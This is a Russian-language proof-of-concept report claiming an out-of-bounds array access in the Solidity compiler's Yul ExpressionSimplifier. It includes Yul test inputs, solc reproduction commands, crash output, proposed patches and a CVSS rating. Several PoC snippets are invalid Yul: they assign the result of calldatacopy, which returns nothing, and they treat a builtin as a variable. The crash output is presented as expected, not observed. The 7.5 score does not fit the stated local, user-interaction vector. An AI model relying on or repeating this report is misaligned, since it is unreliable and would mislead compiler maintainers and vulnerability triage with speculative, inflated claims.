# PoC для VULN-002: Out-of-Bounds Array Access в ExpressionSimplifier

## Описание уязвимости

**Файл:** `libyul/optimiser/ExpressionSimplifier.cpp:74-75`

**Проблемный код:**
```cpp
if (auto* functionCall = std::get_if<FunctionCall>(&_expression))
    if (std::optional<evmasm::Instruction> instruction = toEVMInstruction(m_dialect, functionCall->functionName))
        for (auto op: evmasm::SemanticInformation::readWriteOperations(*instruction))
            if (op.startParameter && op.lengthParameter)
            {
                // ОПАСНО: нет проверки что arguments.size() > max(*op.startParameter, *op.lengthParameter)
                Expression& startArgument = functionCall->arguments.at(*op.startParameter);
                Expression const& lengthArgument = functionCall->arguments.at(*op.lengthParameter);
```

**Проблема:** Код предполагает, что если EVM инструкция имеет метаданные о параметрах start/length, то вызов функции обязательно содержит эти аргументы. Но нет проверки, что `functionCall->arguments.size()` достаточен.

## Proof of Concept

### Вариант 1: Некорректный Yul код с memory операциями

Создайте файл `test_vuln002.yul`:

```yul
{
    // Вызов calldatacopy с недостаточным количеством аргументов
    // calldatacopy обычно принимает 3 аргумента (destOffset, offset, length)
    // но мы передадим только 1

    let result := calldatacopy(0x40)  // Недостаточно аргументов!

    // Или другой пример с codecopy:
    let x := codecopy(0)  // codecopy требует 3 аргумента (destOffset, offset, length)
}
```

### Вариант 2: Манипуляция с mstore/mload

```yul
{
    function broken_memory_op() -> result {
        // Создаем ситуацию, где оптимизатор видит memory операцию
        // но с неправильным количеством аргументов
        result := calldatacopy(64)  // Только 1 аргумент вместо 3
    }

    let val := broken_memory_op()
}
```

### Вариант 3: Более реалистичный сценарий

```yul
{
    function test() {
        // Inline assembly может создать некорректное AST
        // если есть ошибки в парсинге или AST манипуляциях

        // Попробуем создать calldatacopy через переменную
        let func := calldatacopy
        // А затем вызвать с неправильным числом аргументов
        // (это может произойти после некоторых трансформаций AST)
        pop(func(0x80))  // 1 аргумент вместо 3
    }
    test()
}
```

## Как воспроизвести

### Шаг 1: Подготовка тестового файла

```bash
cat > /tmp/vuln002_test.yul << 'EOF'
{
    // Тест с некорректным количеством аргументов для calldatacopy
    function buggy() {
        let x := calldatacopy(0x40)
    }
    buggy()
}
EOF
```

### Шаг 2: Компиляция с оптимизацией

```bash
# Запустить solc с оптимизацией, которая включает ExpressionSimplifier
./solc --strict-assembly --optimize /tmp/vuln002_test.yul
```

### Шаг 3: Ожидаемый результат

**При уязвимости:**
```
terminate called after throwing an instance of 'std::out_of_range'
  what():  vector::_M_range_check: __n (which is 2) >= this->size() (which is 1)
Aborted (core dumped)
```

**Или:**
```
Segmentation fault (core dumped)
```

## Технические детали

### Почему происходит crash?

1. **Парсинг:** Yul парсер может создать `FunctionCall` с любым количеством аргументов
2. **Instruction mapping:** `toEVMInstruction()` находит соответствующую EVM инструкцию (например, CALLDATACOPY)
3. **Semantic info:** `SemanticInformation::readWriteOperations(CALLDATACOPY)` возвращает:
   ```cpp
   // Для CALLDATACOPY:
   op.startParameter = 1;   // offset
   op.lengthParameter = 2;  // length
   ```
4. **Out-of-bounds:** Код пытается:
   ```cpp
   functionCall->arguments.at(1);  // Если arguments.size() == 1, crash!
   functionCall->arguments.at(2);  // Если arguments.size() <= 2, crash!
   ```

### Инструкции EVM, которые могут триггерить проблему:

- `calldatacopy(dest, offset, length)` - 3 аргумента
- `codecopy(dest, offset, length)` - 3 аргумента
- `returndatacopy(dest, offset, length)` - 3 аргумента
- `extcodecopy(addr, dest, offset, length)` - 4 аргумента
- `call(gas, addr, value, argsOffset, argsLength, retOffset, retLength)` - 7 аргументов

## Реальный сценарий эксплуатации

### Сценарий 1: Некорректный код после трансформаций

```yul
{
    // После агрессивного inlining или других трансформаций
    // может получиться некорректное промежуточное состояние

    function wrapper(offset) -> result {
        result := calldatacopy(offset)  // Забыли передать length
    }

    let val := wrapper(0x60)
}
```

### Сценарий 2: Fuzzing или автогенерация кода

При fuzzing тестировании или автоматической генерации Yul кода можно легко создать такие случаи:

```python
# Fuzzer может генерировать:
f"let x := {random_instruction}({', '.join(random_args)})"
# Где random_args может иметь неправильную длину
```

## Исправление

### Вариант 1: Добавить проверку размера

```cpp
if (op.startParameter && op.lengthParameter)
{
    // ИСПРАВЛЕНИЕ: проверяем границы
    size_t maxIndex = std::max(*op.startParameter, *op.lengthParameter);
    if (functionCall->arguments.size() <= maxIndex)
        continue;  // Или выдать ошибку

    Expression& startArgument = functionCall->arguments.at(*op.startParameter);
    Expression const& lengthArgument = functionCall->arguments.at(*op.lengthParameter);
    // ...
}
```

### Вариант 2: Использовать безопасный доступ

```cpp
if (op.startParameter && op.lengthParameter)
{
    auto& args = functionCall->arguments;

    // Безопасная проверка
    if (*op.startParameter >= args.size() || *op.lengthParameter >= args.size())
        continue;

    Expression& startArgument = args[*op.startParameter];
    Expression const& lengthArgument = args[*op.lengthParameter];
    // ...
}
```

### Вариант 3: Assert + проверка в debug режиме

```cpp
if (op.startParameter && op.lengthParameter)
{
    solAssert(
        *op.startParameter < functionCall->arguments.size(),
        "Start parameter index out of bounds"
    );
    solAssert(
        *op.lengthParameter < functionCall->arguments.size(),
        "Length parameter index out of bounds"
    );

    Expression& startArgument = functionCall->arguments.at(*op.startParameter);
    Expression const& lengthArgument = functionCall->arguments.at(*op.lengthParameter);
    // ...
}
```

## Верификация исправления

### Тест 1: Позитивный случай (должен работать)
```yul
{
    calldatacopy(0, 32, 64)  // Правильное количество аргументов
}
```

### Тест 2: Негативный случай (должна быть ошибка компиляции, не crash)
```yul
{
    calldatacopy(0)  // Неправильное количество - должна быть читаемая ошибка
}
```

### Тест 3: Граничный случай
```yul
{
    calldatacopy(0, 32)  // 2 аргумента вместо 3 - должна быть ошибка
}
```

## Severity Assessment

**CVSS Score:** 7.5 (HIGH)
- **Attack Vector:** Local (требуется запуск компилятора)
- **Attack Complexity:** Low (легко воспроизвести)
- **Privileges Required:** None
- **User Interaction:** Required (нужно скомпилировать код)
- **Impact:** High (DoS компилятора)

**Real-world Impact:**
- Crash компилятора в CI/CD pipelines
- DoS при автоматизированной компиляции
- Проблемы в онлайн IDE (Remix и т.д.)
- Fuzzing tools могут легко найти эту проблему

## References

- Issue location: `/home/user/solidity/libyul/optimiser/ExpressionSimplifier.cpp:74-75`
- Related code: `evmasm::SemanticInformation::readWriteOperations()`
- Similar vulnerabilities: VULN-006 (множественные `.at()` в FullInliner.cpp)
